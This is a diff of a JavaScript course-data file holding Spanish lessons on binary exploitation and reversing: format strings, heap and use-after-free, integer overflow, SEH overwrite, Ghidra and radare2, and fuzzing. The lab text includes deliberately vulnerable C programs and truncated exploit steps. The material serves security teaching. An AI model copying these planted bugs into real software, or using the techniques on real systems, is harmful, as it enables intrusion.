       "Usa ropper en lugar de ROPgadget y compara resultados.",
@@ -6415,7 +6415,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Entender y explotar las vulnerabilidades de cadena de formato, que aparecen cuando datos del usuario llegan sin control al primer argumento de printf/fprintf/syslog.",
-    "theory": "Entender y explotar las vulnerabilidades de cadena de formato, que aparecen cuando datos del usuario llegan sin control al primer argumento de printf/fprintf/syslog. Aprenderás a usar %p para leer la pila (info leak) y %n para escribir memoria arbitraria, dos primitivas potentísimas que permiten filtrar canarios/direcciones y sobrescribir la GOT. > ⚠️ Ética: solo en binarios de laboratorio o retos autorizados.",
+    "theory": "Entender y explotar las vulnerabilidades de cadena de formato, que aparecen cuando datos del usuario llegan sin control al primer argumento de printf/fprintf/syslog. Aprenderás a usar %p para leer la pila (info leak) y %n para escribir memoria arbitraria, dos primitivas potentísimas que permiten filtrar canarios/direcciones y sobrescribir la GOT. ⚠️ Ética: solo en binarios de laboratorio o retos autorizados.",
     "outcomes": [
       "Reconocer el patrón vulnerable (printf(user_input)).",
       "Filtrar memoria con %p/%x y localizar el offset del argumento controlado.",
@@ -6442,7 +6442,7 @@ export const CLASSES = [
       "fmtstr_payload: genera el payload de escritura automáticamente. Clave: `fmtstr_payload(offset,"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Confirma la vulnerabilidad enviando %p %p %p %p: verás valores de la pila en vez del texto literal. 2. Localiza el offset de tu buffer: ``bash printf 'AAAABBBB %1$p %2$p %3$p %4$p %5$p %6$p\\n' | ./fmt ` Cuenta hasta ver 0x42424242... o 0x41414141; ese índice N es tu offset. 3. Fuga de una dirección de la GOT para derrotar ASLR: `python from pwn import * elf = context.binary =…",
+    "lab": "Entorno propio. 1. Confirma la vulnerabilidad enviando %p %p %p %p: verás valores de la pila en vez del texto literal. 2. Localiza el offset de tu buffer: ``bash printf 'AAAABBBB %1$p %2$p %3$p %4$p %5$p %6$p\\n' | ./fmt ` Cuenta hasta ver 0x42424242... o 0x41414141; ese índice N es tu offset. 3. Fuga de una dirección de la GOT para derrotar ASLR: `python from pwn import * elf = context.binary = E…",
     "exercises": [
       "Determina el offset del argumento controlado en tu binario.",
       "Filtra el stack canary de un binario con canary usando %p.",
@@ -6463,7 +6463,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "130 min",
     "description": "Entender cómo funciona el heap de glibc (ptmalloc2): chunks, cabeceras de tamaño, bins y arenas.",
-    "theory": "Entender cómo funciona el heap de glibc (ptmalloc2): chunks, cabeceras de tamaño, bins y arenas. Sin este modelo mental, las técnicas de explotación de heap (UAF, double free, tcache poisoning) son magia negra. Aprenderás a inspeccionar el heap en vivo con pwndbg y a razonar sobre cómo malloc/free reorganizan la memoria. > ⚠️ Ética: solo en laboratorio propio.",
+    "theory": "Entender cómo funciona el heap de glibc (ptmalloc2): chunks, cabeceras de tamaño, bins y arenas. Sin este modelo mental, las técnicas de explotación de heap (UAF, double free, tcache poisoning) son magia negra. Aprenderás a inspeccionar el heap en vivo con pwndbg y a razonar sobre cómo malloc/free reorganizan la memoria. ⚠️ Ética: solo en laboratorio propio.",
     "outcomes": [
       "Describir la estructura de un chunk: prev_size, size, flags, datos.",
       "Explicar los tipos de bins (tcache, fast, small, large, unsorted).",
@@ -6490,7 +6490,7 @@ export const CLASSES = [
       "PREV_INUSE / consolidación: al liberar, chunks adyacentes libres se fusionan. Clave: falsear"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Programa heapdemo.c: ``c #include <stdlib.h> #include <string.h> int main(){ char a = malloc(0x30); strcpy(a,\"AAAA\"); char b = malloc(0x30); strcpy(b,\"BBBB\"); free(a); free(b); char *c = malloc(0x30); // reutiliza el último liberado (tcache LIFO) return 0; } ` 2. Depura en pwndbg poniendo breakpoints tras cada malloc/free: `gdb pwndbg> break main pwndbg> run pwndbg> heap # mu…",
+    "lab": "Entorno propio. 1. Programa heapdemo.c: ``c #include <stdlib.h> #include <string.h> int main(){ char a = malloc(0x30); strcpy(a,\"AAAA\"); char b = malloc(0x30); strcpy(b,\"BBBB\"); free(a); free(b); char *c = malloc(0x30); // reutiliza el último liberado (tcache LIFO) return 0; } ` 2. Depura en pwndbg poniendo breakpoints tras cada malloc/free: `gdb pwndbg> break main pwndbg> run pwndbg> heap # mues…",
     "exercises": [
       "Dibuja el layout de dos chunks contiguos indicando dónde está size de cada uno.",
       "Muestra con pwndbg el contenido del tcache tras liberar 3 chunks iguales.",
@@ -6511,7 +6511,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "140 min",
     "description": "Explotar dos de las corrupciones de heap más frecuentes: use-after-free (UAF), donde se usa un puntero a memoria ya liberada, y double free, donde se libera dos veces el mismo chunk.",
-    "theory": "Explotar dos de las corrupciones de heap más frecuentes: use-after-free (UAF), donde se usa un puntero a memoria ya liberada, y double free, donde se libera dos veces el mismo chunk. Verás cómo el UAF permite leer/escribir datos ajenos y secuestrar punteros de función, y cómo un double free en tcache (tcache poisoning) logra escritura arbitraria para redirigir malloc a una dirección elegida. > ⚠️ Ética: solo en laboratorio propio o CTF autorizado.",
+    "theory": "Explotar dos de las corrupciones de heap más frecuentes: use-after-free (UAF), donde se usa un puntero a memoria ya liberada, y double free, donde se libera dos veces el mismo chunk. Verás cómo el UAF permite leer/escribir datos ajenos y secuestrar punteros de función, y cómo un double free en tcache (tcache poisoning) logra escritura arbitraria para redirigir malloc a una dirección elegida. ⚠️ Ética: solo en laboratorio propio o CTF autorizado.",
     "outcomes": [
       "Explicar las causas de UAF y double free y su impacto.",
       "Aprovechar un UAF para leer/escribir sobre un objeto reasignado.",
@@ -6538,7 +6538,7 @@ export const CLASSES = [
       "__free_hook / __malloc_hook: punteros de función históricos usados como objetivo de escritura."
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. UAF — programa uaf.c: ``c #include <stdio.h> #include <stdlib.h> #include <string.h> int main(){ char a = malloc(0x40); free(a); // a queda colgante char b = malloc(0x40); // reutiliza el mismo chunk strcpy(b, \"datos de b\"); printf(\"a ahora lee: %s\\n\", a); // UAF: a y b son la misma memoria } ` Ejecuta y observa que a \"ve\" lo que escribió b. 2. Detecta el bug con ASan: ./uaf_…",
+    "lab": "Entorno propio. 1. UAF — programa uaf.c: ``c #include <stdio.h> #include <stdlib.h> #include <string.h> int main(){ char a = malloc(0x40); free(a); // a queda colgante char b = malloc(0x40); // reutiliza el mismo chunk strcpy(b, \"datos de b\"); printf(\"a ahora lee: %s\\n\", a); // UAF: a y b son la misma memoria } ` Ejecuta y observa que a \"ve\" lo que escribió b. 2. Detecta el bug con ASan: ./uaf_as…",
     "exercises": [
       "Corrige el uaf.c poniendo el puntero a NULL tras free y confirma con ASan.",
       "Explica por qué el chunk reasignado solapa los dos punteros.",
@@ -6559,7 +6559,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "100 min",
     "description": "Comprender cómo los errores aritméticos con enteros (overflow, underflow, truncamiento, confusión signed/unsigned) se convierten en vulnerabilidades de memoria: una multiplicación de tamaño que se desborda genera un mal…",
-    "theory": "Comprender cómo los errores aritméticos con enteros (overflow, underflow, truncamiento, confusión signed/unsigned) se convierten en vulnerabilidades de memoria: una multiplicación de tamaño que se desborda genera un malloc demasiado pequeño y, después, un overflow de heap. Aprenderás a detectar estos patrones y a explotarlos indirectamente. > ⚠️ Ética: solo en laboratorio propio.",
+    "theory": "Comprender cómo los errores aritméticos con enteros (overflow, underflow, truncamiento, confusión signed/unsigned) se convierten en vulnerabilidades de memoria: una multiplicación de tamaño que se desborda genera un malloc demasiado pequeño y, después, un overflow de heap. Aprenderás a detectar estos patrones y a explotarlos indirectamente. ⚠️ Ética: solo en laboratorio propio.",
     "outcomes": [
       "Explicar overflow, underflow, truncamiento y confusión de signo.",
       "Identificar cálculos de tamaño vulnerables antes de malloc/memcpy.",
@@ -6585,7 +6585,7 @@ export const CLASSES = [
       "Off-by-one: escribir un elemento de más (típico <= en vez de <). Clave: puede sobrescribir"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Cálculo de tamaño vulnerable intov.c: ``c #include <stdio.h> #include <stdlib.h> #include <string.h> char dup_items(unsigned n){ // BUG: n 8 puede desbordar en 32 bits -> buffer minúsculo unsigned size = n 8; char buf = malloc(size); for (unsigned i = 0; i < n; i++) memcpy(buf + i8, \"AAAAAAAA\", 8); // heap overflow return buf; } int main(int argc, char argv){ dup_items(strtou…",
+    "lab": "Entorno propio. 1. Cálculo de tamaño vulnerable intov.c: ``c #include <stdio.h> #include <stdlib.h> #include <string.h> char dup_items(unsigned n){ // BUG: n 8 puede desbordar en 32 bits -> buffer minúsculo unsigned size = n 8; char buf = malloc(size); for (unsigned i = 0; i < n; i++) memcpy(buf + i8, \"AAAAAAAA\", 8); // heap overflow return buf; } int main(int argc, char argv){ dup_items(strtoul(…",
     "exercises": [
       "Muestra un ejemplo de underflow (len=0; len-1) y su valor resultante.",
       "Escribe un chequeo previo a malloc que rechace el overflow.",
@@ -6606,7 +6606,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "130 min",
     "description": "Trasladar los conceptos de explotación al mundo Windows, centrándote en el mecanismo de manejo estructurado de excepciones (SEH) y en cómo un overflow que corrompe la cadena SEH permite secuestrar el flujo pese a alguna…",
-    "theory": "Trasladar los conceptos de explotación al mundo Windows, centrándote en el mecanismo de manejo estructurado de excepciones (SEH) y en cómo un overflow que corrompe la cadena SEH permite secuestrar el flujo pese a algunas mitigaciones. Verás el uso de POP POP RET, la técnica clásica de sobrescritura de SEH y cómo SafeSEH/SEHOP la complican. > ⚠️ Ética: exclusivamente en una VM Windows propia y aislada, con software vulnerable de > laboratorio (retos como \"vulnserver\"). Nunca contra sistemas de terceros.",
+    "theory": "Trasladar los conceptos de explotación al mundo Windows, centrándote en el mecanismo de manejo estructurado de excepciones (SEH) y en cómo un overflow que corrompe la cadena SEH permite secuestrar el flujo pese a algunas mitigaciones. Verás el uso de POP POP RET, la técnica clásica de sobrescritura de SEH y cómo SafeSEH/SEHOP la complican. ⚠️ Ética: exclusivamente en una VM Windows propia y aislada, con software vulnerable de laboratorio (retos como \"vulnserver\"). Nunca contra sistemas de terceros.",
     "outcomes": [
       "Explicar la cadena SEH: _EXCEPTION_REGISTRATION_RECORD (next + handler).",
       "Describir el ataque de sobrescritura de SEH y el rol de POP POP RET.",
@@ -6638,7 +6638,7 @@ export const CLASSES = [
       "vulnserver como objetivo de práctica legal.",
       "pwntools/python para enviar el payload por socket."
     ],
-    "lab": "> Entorno propio: VM Windows aislada + vulnserver (software de práctica). 1. Lanza vulnserver y conéctate con nc/pwntools; identifica el comando vulnerable (p. ej. GMON). 2. Provoca el crash enviando una cadena larga y observa en el debugger que la cadena SEH se sobrescribe (ver SEH chain). 3. Halla el offset a nSEH/SEH con un patrón cíclico: ``text !mona pc 5000 ; genera patrón ; (crash) !mona f…",
+    "lab": "Entorno propio: VM Windows aislada + vulnserver (software de práctica). 1. Lanza vulnserver y conéctate con nc/pwntools; identifica el comando vulnerable (p. ej. GMON). 2. Provoca el crash enviando una cadena larga y observa en el debugger que la cadena SEH se sobrescribe (ver SEH chain). 3. Halla el offset a nSEH/SEH con un patrón cíclico: ``text !mona pc 5000 ; genera patrón ; (crash) !mona fin…",
     "exercises": [
       "Localiza los badchars del servicio con !mona bytearray y compara memoria.",
       "Explica por qué se salta primero a nSEH y no directamente al shellcode.",
@@ -6659,7 +6659,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "110 min",
     "description": "Sentar las bases de la ingeniería inversa de software: qué es, para qué sirve (análisis de malware, descubrimiento de vulnerabilidades, interoperabilidad, CTF), y qué contiene un binario ejecutable.",
-    "theory": "Sentar las bases de la ingeniería inversa de software: qué es, para qué sirve (análisis de malware, descubrimiento de vulnerabilidades, interoperabilidad, CTF), y qué contiene un binario ejecutable. Verás los formatos ELF (Linux) y PE (Windows), las secciones, símbolos y strings, y el flujo general de un análisis: reconocimiento estático rápido antes de abrir un desensamblador. > ⚠️ Ética: aplica ingeniería inversa solo a binarios propios, de práctica o cuya licencia/permiso > lo autoricen. Respeta la ley y los términos de uso.",
+    "theory": "Sentar las bases de la ingeniería inversa de software: qué es, para qué sirve (análisis de malware, descubrimiento de vulnerabilidades, interoperabilidad, CTF), y qué contiene un binario ejecutable. Verás los formatos ELF (Linux) y PE (Windows), las secciones, símbolos y strings, y el flujo general de un análisis: reconocimiento estático rápido antes de abrir un desensamblador. ⚠️ Ética: aplica ingeniería inversa solo a binarios propios, de práctica o cuya licencia/permiso lo autoricen. Respeta la ley y los términos de uso.",
     "outcomes": [
       "Definir ingeniería inversa y sus casos de uso legítimos.",
       "Describir la estructura de un ELF y un PE (cabeceras, secciones, símbolos).",
@@ -6685,7 +6685,7 @@ export const CLASSES = [
       "Triage estático: primera pasada con herramientas ligeras antes de desensamblar. Clave: ahorra"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Compila o toma un binario de práctica (crackme) y haz el triage: ``bash file crackme checksec --file=crackme strings -n 6 crackme | less # busca prompts, rutas, contraseñas, formatos ` 2. Explora la estructura ELF: `bash readelf -h crackme # cabecera, entry point readelf -S crackme # secciones readelf -s crackme | head # símbolos (si no está stripped) ` 3. Localiza la función…",
+    "lab": "Entorno propio. 1. Compila o toma un binario de práctica (crackme) y haz el triage: ``bash file crackme checksec --file=crackme strings -n 6 crackme | less # busca prompts, rutas, contraseñas, formatos ` 2. Explora la estructura ELF: `bash readelf -h crackme # cabecera, entry point readelf -S crackme # secciones readelf -s crackme | head # símbolos (si no está stripped) ` 3. Localiza la función m…",
     "exercises": [
       "Diferencia entre program headers y section headers de un ELF.",
       "Extrae el entry point con readelf y localízalo en el desensamblado.",
@@ -6706,7 +6706,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "130 min",
     "description": "Aprender a usar Ghidra, el framework libre de ingeniería inversa de la NSA, para desensamblar y decompilar binarios a pseudo-C legible.",
-    "theory": "Aprender a usar Ghidra, el framework libre de ingeniería inversa de la NSA, para desensamblar y decompilar binarios a pseudo-C legible. Verás cómo crear un proyecto, navegar por funciones, renombrar variables, corregir tipos y usar el decompilador para entender la lógica de un crackme mucho más rápido que leyendo ensamblador puro. > ⚠️ Ética: analiza solo binarios propios/autorizados.",
+    "theory": "Aprender a usar Ghidra, el framework libre de ingeniería inversa de la NSA, para desensamblar y decompilar binarios a pseudo-C legible. Verás cómo crear un proyecto, navegar por funciones, renombrar variables, corregir tipos y usar el decompilador para entender la lógica de un crackme mucho más rápido que leyendo ensamblador puro. ⚠️ Ética: analiza solo binarios propios/autorizados.",
     "outcomes": [
       "Crear un proyecto Ghidra e importar/analizar un binario.",
       "Navegar entre listing (ASM) y decompiler (pseudo-C).",
@@ -6733,7 +6733,7 @@ export const CLASSES = [
       "GhidraScript: API para automatizar (Python/Jython o Java). Clave: util para desofuscar o"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Crea un proyecto no compartido (File → New Project), importa el crackme y acepta el auto-análisis. 2. En el Symbol Tree abre main; observa el panel Decompiler (pseudo-C) junto al Listing. 3. Localiza la comparación de la clave. Renombra variables genéricas (local_28 → input, uVar1 → len) con L para clarificar la lógica. 4. Sigue las xrefs de la cadena del prompt: haz doble cl…",
+    "lab": "Entorno propio. 1. Crea un proyecto no compartido (File → New Project), importa el crackme y acepta el auto-análisis. 2. En el Symbol Tree abre main; observa el panel Decompiler (pseudo-C) junto al Listing. 3. Localiza la comparación de la clave. Renombra variables genéricas (local_28 → input, uVar1 → len) con L para clarificar la lógica. 4. Sigue las xrefs de la cadena del prompt: haz doble clic…",
     "exercises": [
       "Renombra y comenta main hasta que el pseudo-C sea autoexplicativo.",
       "Define una struct para un objeto que el binario usa y aplícala.",
@@ -6754,7 +6754,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Conocer los otros dos pilares del reversing: IDA Pro (estándar comercial, con Hex-Rays) y radare2/rizin (framework libre de línea de comandos, con Cutter como GUI).",
-    "theory": "Conocer los otros dos pilares del reversing: IDA Pro (estándar comercial, con Hex-Rays) y radare2/rizin (framework libre de línea de comandos, con Cutter como GUI). Aprenderás a moverte por un binario en ambos, a comparar sus filosofías (GUI vs REPL) y a elegir la herramienta según la tarea. > ⚠️ Ética: solo binarios propios/autorizados.",
+    "theory": "Conocer los otros dos pilares del reversing: IDA Pro (estándar comercial, con Hex-Rays) y radare2/rizin (framework libre de línea de comandos, con Cutter como GUI). Aprenderás a moverte por un binario en ambos, a comparar sus filosofías (GUI vs REPL) y a elegir la herramienta según la tarea. ⚠️ Ética: solo binarios propios/autorizados.",
     "outcomes": [
       "Navegar un binario en IDA (grafos, pseudo-C de Hex-Rays, xrefs).",
       "Analizar el mismo binario en radare2 con los comandos esenciales.",
@@ -6780,7 +6780,7 @@ export const CLASSES = [
       "r2pipe: API para pilotar r2 desde Python. Clave: automatiza extracción y análisis en lote."
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Abre el crackme en radare2 y analiza: ``bash r2 -A ./crackme # -A ejecuta aaa (análisis) [0x...]> afl # lista funciones [0x...]> s main; pdf # desensambla main [0x...]> VV @ main # grafo interactivo (q para salir) ` 2. Renombra y comenta en r2: `text afvn old_name input ; renombrar variable CCu \"clave se compara aqui\" @ 0x... ; comentario ` 3. Busca cadenas y sus xrefs: `text…",
+    "lab": "Entorno propio. 1. Abre el crackme en radare2 y analiza: ``bash r2 -A ./crackme # -A ejecuta aaa (análisis) [0x...]> afl # lista funciones [0x...]> s main; pdf # desensambla main [0x...]> VV @ main # grafo interactivo (q para salir) ` 2. Renombra y comenta en r2: `text afvn old_name input ; renombrar variable CCu \"clave se compara aqui\" @ 0x... ; comentario ` 3. Busca cadenas y sus xrefs: `text i…",
     "exercises": [
       "Lista y comenta las diferencias de flujo IDA (GUI) vs r2 (REPL).",
       "Usa pdc (pseudo-decompile) de r2 y compáralo con Hex-Rays.",
@@ -6801,7 +6801,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Profundizar en el análisis estático: entender un binario sin ejecutarlo.",
-    "theory": "Profundizar en el análisis estático: entender un binario sin ejecutarlo. Estudiarás el desensamblado (lineal vs recursivo), la reconstrucción del grafo de control de flujo (CFG) y de llamadas (call graph), el análisis de flujo de datos elemental y los límites del enfoque estático frente a código ofuscado o generado dinámicamente. Es la base rigurosa del reversing profesional. > ⚠️ Ética: solo binarios propios/autorizados.",
+    "theory": "Profundizar en el análisis estático: entender un binario sin ejecutarlo. Estudiarás el desensamblado (lineal vs recursivo), la reconstrucción del grafo de control de flujo (CFG) y de llamadas (call graph), el análisis de flujo de datos elemental y los límites del enfoque estático frente a código ofuscado o generado dinámicamente. Es la base rigurosa del reversing profesional. ⚠️ Ética: solo binarios propios/autorizados.",
     "outcomes": [
       "Distinguir desensamblado lineal y recursivo y sus fallos típicos.",
       "Reconstruir el CFG y el call graph de una función.",
@@ -6828,7 +6828,7 @@ export const CLASSES = [
       "Límites del estático: packing, cifrado, self-modifying code, saltos indirectos. Clave: exigen"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Compara desensamblado lineal vs recursivo en un binario con datos incrustados: ``bash objdump -d crackme # lineal (GNU) # En Ghidra/IDA/r2 el análisis es recursivo: contrasta la función donde difieren ` 2. Reconstruye el CFG de main en Ghidra (Window → Function Graph) e identifica bucles y ramas de éxito/fracaso. 3. Escribe un desensamblador mínimo con capstone para ver cómo…",
+    "lab": "Entorno propio. 1. Compara desensamblado lineal vs recursivo en un binario con datos incrustados: ``bash objdump -d crackme # lineal (GNU) # En Ghidra/IDA/r2 el análisis es recursivo: contrasta la función donde difieren ` 2. Reconstruye el CFG de main en Ghidra (Window → Function Graph) e identifica bucles y ramas de éxito/fracaso. 3. Escribe un desensamblador mínimo con capstone para ver cómo se…",
     "exercises": [
       "Encuentra un caso donde el desensamblado lineal se desincronice.",
       "Dibuja el CFG de una función con un bucle y una condición.",
@@ -6849,7 +6849,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Observar el binario en ejecución para revelar lo que el análisis estático no puede: valores en runtime, rutas realmente tomadas, cadenas descifradas, llamadas a librería y syscalls.",
-    "theory": "Observar el binario en ejecución para revelar lo que el análisis estático no puede: valores en runtime, rutas realmente tomadas, cadenas descifradas, llamadas a librería y syscalls. Combinarás ltrace/strace, GDB con scripting, tracing con Frida y emulación selectiva, cerrando el ciclo estático↔dinámico del reversing. > ⚠️ Ética: ejecuta binarios desconocidos solo en una VM aislada (sin red hacia producción, > snapshots antes/después). Solo binarios propios/autorizados.",
+    "theory": "Observar el binario en ejecución para revelar lo que el análisis estático no puede: valores en runtime, rutas realmente tomadas, cadenas descifradas, llamadas a librería y syscalls. Combinarás ltrace/strace, GDB con scripting, tracing con Frida y emulación selectiva, cerrando el ciclo estático↔dinámico del reversing. ⚠️ Ética: ejecuta binarios desconocidos solo en una VM aislada (sin red hacia producción, snapshots antes/después). Solo binarios propios/autorizados.",
     "outcomes": [
       "Trazar llamadas a librería y syscalls con ltrace/strace.",
       "Automatizar GDB con breakpoints condicionales y scripts.",
@@ -6876,7 +6876,7 @@ export const CLASSES = [
       "Dump de memoria: volcar regiones para recuperar cadenas descifradas. Clave: en GDB con"
     ],
     "tools": [],
-    "lab": "> Entorno propio / VM aislada. 1. Traza syscalls y llamadas de librería del crackme: ``bash strace -f ./crackme # open/read/write, etc. ltrace ./crackme # a menudo revela strcmp(input, \"SECRET\") ` 2. Si ltrace muestra la comparación, ya tienes la clave. Si está ofuscada, sigue con GDB. 3. GDB con breakpoint condicional y hook automático: `gdb break strcmp commands printf \"cmp: %s vs %s\\n\", $rdi,…",
+    "lab": "Entorno propio / VM aislada. 1. Traza syscalls y llamadas de librería del crackme: ``bash strace -f ./crackme # open/read/write, etc. ltrace ./crackme # a menudo revela strcmp(input, \"SECRET\") ` 2. Si ltrace muestra la comparación, ya tienes la clave. Si está ofuscada, sigue con GDB. 3. GDB con breakpoint condicional y hook automático: `gdb break strcmp commands printf \"cmp: %s vs %s\\n\", $rdi, $r…",
     "exercises": [
       "Encuentra la clave de un crackme usando solo ltrace.",
       "Escribe un script GDB que registre cada strcmp sin detenerse.",
@@ -6897,7 +6897,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Entender las técnicas que dificultan el reversing —packing, cifrado de cadenas, anti-debugging, detección de VM, aplanamiento de flujo (control-flow flattening), virtualización de código— y aprender a derrotarlas con de…",
-    "theory": "Entender las técnicas que dificultan el reversing —packing, cifrado de cadenas, anti-debugging, detección de VM, aplanamiento de flujo (control-flow flattening), virtualización de código— y aprender a derrotarlas con desempaquetado, parcheo y análisis dinámico. Este conocimiento sirve tanto para analizar malware (Parte 6) como para proteger tu propio software. > ⚠️ Ética: analiza solo binarios propios/autorizados o muestras en laboratorio aislado.",
+    "theory": "Entender las técnicas que dificultan el reversing —packing, cifrado de cadenas, anti-debugging, detección de VM, aplanamiento de flujo (control-flow flattening), virtualización de código— y aprender a derrotarlas con desempaquetado, parcheo y análisis dinámico. Este conocimiento sirve tanto para analizar malware (Parte 6) como para proteger tu propio software. ⚠️ Ética: analiza solo binarios propios/autorizados o muestras en laboratorio aislado.",
     "outcomes": [
       "Clasificar técnicas de ofuscación y anti-reversing.",
       "Detectar packing por entropía, secciones e imports.",
@@ -6924,7 +6924,7 @@ export const CLASSES = [
       "Virtualización: el código se traduce a un bytecode propio interpretado por una VM embebida."
     ],
     "tools": [],
-    "lab": "> Entorno propio / VM aislada. 1. Detecta packing por entropía y secciones: ``bash upx -t crackme.packed 2>/dev/null && echo \"empacado con UPX\" python3 - <<'PY' import math,sys d=open(\"crackme.packed\",\"rb\").read() from collections import Counter c=Counter(d); H=-sum(n/len(d)*math.log2(n/len(d)) for n in c.values()) print(\"entropia:\",round(H,2)) # ~7.9 sugiere empaquetado/cifrado PY ` 2. Desempaqu…",
+    "lab": "Entorno propio / VM aislada. 1. Detecta packing por entropía y secciones: ``bash upx -t crackme.packed 2>/dev/null && echo \"empacado con UPX\" python3 - <<'PY' import math,sys d=open(\"crackme.packed\",\"rb\").read() from collections import Counter c=Counter(d); H=-sum(n/len(d)*math.log2(n/len(d)) for n in c.values()) print(\"entropia:\",round(H,2)) # ~7.9 sugiere empaquetado/cifrado PY ` 2. Desempaquet…",
     "exercises": [
       "Calcula la entropía de un binario normal y de uno empacado; compara.",
       "Desempaqueta un UPX y confirma con objdump que ves más funciones.",
@@ -6945,7 +6945,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "140 min",
     "description": "Descubrir vulnerabilidades automáticamente mediante fuzzing: alimentar a un programa con miles de entradas mutadas guiadas por cobertura hasta provocar crashes.",
-    "theory": "Descubrir vulnerabilidades automáticamente mediante fuzzing: alimentar a un programa con miles de entradas mutadas guiadas por cobertura hasta provocar crashes. Aprenderás a compilar objetivos con instrumentación, a lanzar campañas con AFL++ y libFuzzer, a combinar con sanitizers (ASan/UBSan) y a triar y minimizar los crashes encontrados. > ⚠️ Ética: fuzzea software propio, open source con permiso o dentro de programas autorizados. > Reporta hallazgos de forma responsable.",
+    "theory": "Descubrir vulnerabilidades automáticamente mediante fuzzing: alimentar a un programa con miles de entradas mutadas guiadas por cobertura hasta provocar crashes. Aprenderás a compilar objetivos con instrumentación, a lanzar campañas con AFL++ y libFuzzer, a combinar con sanitizers (ASan/UBSan) y a triar y minimizar los crashes encontrados. ⚠️ Ética: fuzzea software propio, open source con permiso o dentro de programas autorizados. Reporta hallazgos de forma responsable.",
     "outcomes": [
       "Explicar el fuzzing guiado por cobertura y por qué es efectivo.",
       "Instrumentar un objetivo con afl-cc/-fsanitize=fuzzer.",
@@ -6972,7 +6972,7 @@ export const CLASSES = [
       "Triage/minimización: clasificar crashes por causa y reducir el input al mínimo. Clave: afl-tmin,"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Objetivo vulnerable parser.c (tiene un overflow deliberado): ``c #include <stdio.h> #include <string.h> void parse(const char *s){ char b[16]; if(s[0]=='F' && s[1]=='U') strcpy(b, s); } int main(int c, char**v){ char buf[256]; FILEf=fopen(v[1],\"rb\"); int n=fread(buf,1,255,f); buf[n]=0; parse(buf); } ` 2. Compila con instrumentación AFL++ + ASan y prepara el corpus: `bash afl-…",
+    "lab": "Entorno propio. 1. Objetivo vulnerable parser.c (tiene un overflow deliberado): ``c #include <stdio.h> #include <string.h> void parse(const char *s){ char b[16]; if(s[0]=='F' && s[1]=='U') strcpy(b, s); } int main(int c, char**v){ char buf[256]; FILEf=fopen(v[1],\"rb\"); int n=fread(buf,1,255,f); buf[n]=0; parse(buf); } ` 2. Compila con instrumentación AFL++ + ASan y prepara el corpus: `bash afl-cc…",
     "exercises": [
       "Crea un corpus semilla mejor y mide el impacto en cobertura.",
       "Escribe un diccionario para un formato con magic bytes y compáralo sin él.",
@@ -6993,7 +6993,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Aprender a encontrar vulnerabilidades de forma sistemática combinando auditoría manual de código, análisis estático automatizado (SAST) y razonamiento sobre superficies de ataque.",
-    "theory": "Aprender a encontrar vulnerabilidades de forma sistemática combinando auditoría manual de código, análisis estático automatizado (SAST) y razonamiento sobre superficies de ataque. Complementa el fuzzing (clase 136) con la revisión dirigida que detecta bugs lógicos y patrones peligrosos que el fuzzer no alcanza fácilmente. Cerrarás con la práctica de divulgación responsable. > ⚠️ Ética: audita código propio, open source o con autorización. Reporta de forma responsable > (coordinated disclosure), nunca publiques 0-days de terceros sin proceso.",
+    "theory": "Aprender a encontrar vulnerabilidades de forma sistemática combinando auditoría manual de código, análisis estático automatizado (SAST) y razonamiento sobre superficies de ataque. Complementa el fuzzing (clase 136) con la revisión dirigida que detecta bugs lógicos y patrones peligrosos que el fuzzer no alcanza fácilmente. Cerrarás con la práctica de divulgación responsable. ⚠️ Ética: audita código propio, open source o con autorización. Reporta de forma responsable (coordinated disclosure), nunca publiques 0-days de terceros sin proceso.",
     "outcomes": [
       "Modelar la superficie de ataque de un componente (entradas, confianza, límites).",
       "Auditar código C/C++ buscando patrones peligrosos (memoria, enteros, formato).",
@@ -7020,7 +7020,7 @@ export const CLASSES = [
       "Explotabilidad: qué tan factible es convertir el bug en impacto real. Clave: guía la"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Modela la superficie de ataque de un proyecto C pequeño: lista funciones que reciben datos externos (argv, ficheros, red) y márcalas como fuentes. 2. Ejecuta SAST y compara resultados: ``bash cppcheck --enable=all --inconclusive src/ 2> cppcheck.txt scan-build make # clang static analyzer semgrep --config p/c src/ ` 3. Sigue una advertencia real (p. ej. memcpy con tamaño cont…",
+    "lab": "Entorno propio. 1. Modela la superficie de ataque de un proyecto C pequeño: lista funciones que reciben datos externos (argv, ficheros, red) y márcalas como fuentes. 2. Ejecuta SAST y compara resultados: ``bash cppcheck --enable=all --inconclusive src/ 2> cppcheck.txt scan-build make # clang static analyzer semgrep --config p/c src/ ` 3. Sigue una advertencia real (p. ej. memcpy con tamaño contro…",
     "exercises": [
       "Dibuja el diagrama de superficie de ataque de un servicio que lee de red.",
       "Encuentra manualmente un sprintf sin límite y explica el riesgo.",
@@ -7041,7 +7041,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "140 min",
     "description": "Integrar todo lo aprendido en un flujo de desarrollo de exploits moderno: encadenar primitivas (info leak → cálculo de bases → escritura/control de flujo → ROP → shell), automatizar con pwntools, manejar la libc correct…",
